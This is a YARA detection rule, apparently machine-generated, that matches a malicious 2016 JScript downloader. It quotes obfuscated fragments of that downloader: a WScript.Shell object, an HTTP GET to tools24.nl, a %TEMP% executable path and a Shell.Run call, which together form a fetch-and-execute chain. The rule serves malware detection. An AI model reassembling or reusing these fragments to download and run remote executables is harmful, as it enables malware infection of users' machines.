rule sig_20160330_61e6a2db2f2ee9d81551c4e9f07adef4 {
  meta:
    description = "datamaliciousorder - file 20160330_61e6a2db2f2ee9d81551c4e9f07adef4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "288313b9ac17e7de2138fe66945add494b303f9f43f38c4b44db3100b3b839c0"

  strings:
    $s1  = "I[WV](\"GET\", \"http://tools24.nl/w8isa\", false);" fullword ascii
    $s2  = "var L = function HG() {return WScript[HV](\"WScript\"+\".Shell\");}(), AP = 11;" fullword ascii
    $s3  = "function HZ(B0, VI){X = X * 1; return B0 - VI;};" fullword ascii
    $s4  = "if (I[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function AG() {return L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gNWuRwZM0O.ex\" + \"e\";};" fullword ascii
    $s6  = "function FM(){return M0 + \"\";};" fullword ascii
    $s7  = "function IY() {return ((AO == true) && (AO == R)) ? 1 : X;};" fullword ascii
    $s8  = "function PF(XN){L[\"Run\"](XN, X, X);};" fullword ascii
    $s9  = "var J = new this[\"Date\"]();" fullword ascii
    $s10 = "function U(){return HV;};" fullword ascii
    $s11 = "}while (MJ);" fullword ascii
    $s12 = "function BX()" fullword ascii
    $s13 = "function D(V) {var KP = (1, 2, 3, 4, 5, V); return KP;};" fullword ascii
    $s14 = "return HZ(X0, LV);" fullword ascii
    $s15 = "function M(){return 22;};" fullword ascii
    $s16 = "AO = true; " fullword ascii
    $s17 = "var AO = false;" fullword ascii
    $s18 = "} catch(O){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}